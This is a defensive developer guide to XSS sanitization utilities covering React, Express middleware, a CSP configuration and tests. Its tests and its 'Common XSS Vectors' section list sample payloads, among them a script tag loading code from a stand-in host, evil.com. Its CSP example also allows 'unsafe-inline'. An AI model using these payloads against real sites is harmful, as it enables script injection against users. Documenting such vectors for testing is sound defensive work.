# 🛡️ XSS Protection Guide

## Overview

This guide explains how to use the XSS sanitization utilities to protect against Cross-Site Scripting (XSS) attacks.

## Frontend Sanitization

### Basic Usage

```typescript
import {
  sanitizeText,
  sanitizeHtml,
  sanitizeUrl,
  sanitizeFormInput,
  sanitizeObject,
} from '@/lib/sanitize';

// Sanitize plain text (safest)
const userInput = "<script>alert('xss')</script>";
const safe = sanitizeText(userInput);
// Result: "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"

// Sanitize HTML (allows some tags but removes scripts)
const htmlInput = "<p>Hello <script>alert('xss')</script></p>";
const safeHtml = sanitizeHtml(htmlInput);
// Result: "<p>Hello </p>"

// Sanitize URL
const url = "javascript:alert('xss')";
const safeUrl = sanitizeUrl(url);
// Result: "" (blocked)

// Sanitize form input
const formValue = "  John Doe  ";
const sanitized = sanitizeFormInput(formValue);
// Result: "John Doe" (trimmed and escaped)
```

### Form Sanitization Example

```typescript
// In a form component
import { sanitizeObject } from '@/lib/sanitize';
import { useForm } from 'react-hook-form';

const MyForm = () => {
  const { handleSubmit } = useForm();

  const onSubmit = (data: FormData) => {
    // Sanitize all form data before sending to API
    const sanitized = sanitizeObject(data);
    
    apiRequest('POST', '/api/employees', sanitized);
  };

  return <form onSubmit={handleSubmit(onSubmit)}>...</form>;
};
```

### Display User Content

```typescript
// When displaying user-generated content
import { sanitizeText } from '@/lib/sanitize';

const UserComment = ({ comment }) => {
  const safeComment = sanitizeText(comment.text);
  
  return (
    <div>
      {/* Safe to display */}
      <p>{safeComment}</p>
      
      {/* Or use dangerouslySetInnerHTML only after sanitization */}
      <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.html) }} />
    </div>
  );
};
```

### URL Validation

```typescript
import { sanitizeUrl } from '@/lib/sanitize';

const SafeLink = ({ href, children }) => {
  const safeHref = sanitizeUrl(href);
  
  if (!safeHref) {
    return <span>{children}</span>; // Don't render dangerous links
  }
  
  return <a href={safeHref}>{children}</a>;
};
```

## Backend Sanitization

### Middleware

```typescript
// server/middleware/sanitize.ts
import { Request, Response, NextFunction } from 'express';
import { sanitizeObject } from '../lib/sanitize.js';

export function sanitizeMiddleware(
  req: Request,
  res: Response,
  next: NextFunction
): void {
  if (req.body && typeof req.body === 'object') {
    req.body = sanitizeObject(req.body);
  }
  
  if (req.query && typeof req.query === 'object') {
    req.query = sanitizeObject(req.query as Record<string, any>);
  }
  
  next();
}

// Apply globally in server/index.ts
app.use(express.json());
app.use(sanitizeMiddleware);
```

### Manual Sanitization

```typescript
import { sanitizeUserInput, containsXss } from '../lib/sanitize.js';

// In route handlers
app.post('/api/employees', async (req, res) => {
  const { full_name, position } = req.body;
  
  // Check for XSS patterns
  if (containsXss(full_name)) {
    return res.status(400).json({ error: 'Invalid input detected' });
  }
  
  // Sanitize before storing
  const employee = await storage.createEmployee({
    full_name: sanitizeUserInput(full_name),
    position: sanitizeUserInput(position),
  });
  
  res.json(employee);
});
```

## Best Practices

### 1. Always Sanitize User Input

```typescript
// ❌ BAD
const comment = req.body.comment;
await storage.createComment({ text: comment });

// ✅ GOOD
import { sanitizeUserInput } from '../lib/sanitize.js';
const comment = sanitizeUserInput(req.body.comment);
await storage.createComment({ text: comment });
```

### 2. Sanitize on Both Sides

```typescript
// Frontend
const sanitized = sanitizeFormInput(formData.name);
apiRequest('POST', '/api/users', { name: sanitized });

// Backend (defense in depth)
app.use(sanitizeMiddleware); // Global sanitization
```

### 3. Use Content Security Policy

```typescript
// server/middleware/helmet-config.ts
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Avoid 'unsafe-inline' in production
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
}));
```

### 4. Validate and Sanitize

```typescript
import { z } from 'zod';
import { sanitizeUserInput } from './lib/sanitize';

// 1. Validate structure with Zod
const schema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
});

// 2. Sanitize content
const validated = schema.parse(req.body);
const sanitized = {
  name: sanitizeUserInput(validated.name),
  email: sanitizeEmail(validated.email),
};
```

### 5. Escape in Templates

React automatically escapes:
```tsx
// ✅ Safe (React escapes by default)
<div>{userInput}</div>

// ⚠️ Dangerous (only use with sanitized content)
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userHtml) }} />
```

## Testing XSS Protection

### Test Cases

```typescript
// tests/security/xss.test.ts
import { sanitizeText, sanitizeHtml, containsXss } from '@/lib/sanitize';

describe('XSS Protection', () => {
  test('blocks script tags', () => {
    const input = '<script>alert("xss")</script>';
    expect(containsXss(input)).toBe(true);
    expect(sanitizeText(input)).not.toContain('<script>');
  });

  test('blocks event handlers', () => {
    const input = '<img src="x" onerror="alert(1)">';
    expect(sanitizeHtml(input)).not.toContain('onerror');
  });

  test('blocks javascript: protocol', () => {
    const input = 'javascript:alert(1)';
    expect(sanitizeUrl(input)).toBe('');
  });

  test('allows safe content', () => {
    const input = 'Hello <b>World</b>';
    const result = sanitizeHtml(input);
    expect(result).toContain('<b>');
    expect(result).toContain('World');
  });
});
```

### Manual Testing

```bash
# Test with XSS payloads
curl -X POST http://localhost:5000/api/employees \
  -H "Content-Type: application/json" \
  -d '{"full_name": "<script>alert(1)</script>"}'

# Should return sanitized data
```

## Common XSS Vectors

### 1. Script Injection
```html
<script>alert('XSS')</script>
<script src="http://evil.com/xss.js"></script>
```

### 2. Event Handlers
```html
<img src="x" onerror="alert('XSS')">
<div onclick="alert('XSS')">Click me</div>
```

### 3. JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')"></iframe>
```

### 4. Data URLs
```html
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
```

### 5. Style Injection
```html
<div style="background:url('javascript:alert(1)')">XSS</div>
```

## Prevention Checklist

- [ ] Sanitize all user input on client side
- [ ] Sanitize all user input on server side
- [ ] Use parameterized queries for database
- [ ] Set Content-Security-Policy headers
- [ ] Validate input with schemas (Zod)
- [ ] Escape output in templates
- [ ] Use HTTPS only
- [ ] Set HttpOnly cookies
- [ ] Implement rate limiting
- [ ] Regular security audits
- [ ] Keep dependencies updated

## Additional Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [React Security Best Practices](https://react.dev/reference/react-dom/server)

---

**Status:** ✅ Implemented  
**Last Updated:** October 30, 2025




